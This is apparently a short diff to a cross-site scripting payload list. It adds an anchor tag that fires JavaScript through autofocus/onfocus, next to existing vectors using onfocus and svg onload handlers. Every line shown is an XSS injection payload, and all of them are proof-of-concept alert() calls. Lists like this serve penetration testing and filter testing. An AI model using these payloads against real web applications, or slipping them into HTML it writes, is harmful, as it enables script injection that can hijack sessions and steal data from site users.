@@ -5,4 +5,6 @@
 <div/tabindex=0/ /autofocus/onfocus=alert(5)>
 <label/tabindex=0/
 <span/tabindex=0/
-<svg onload="alert(1)" <="" svg=""
+<svg onload="alert(1)" <="" svg="" 
+
+<a autofocus onfocus=alert(23) href=#>x</a>
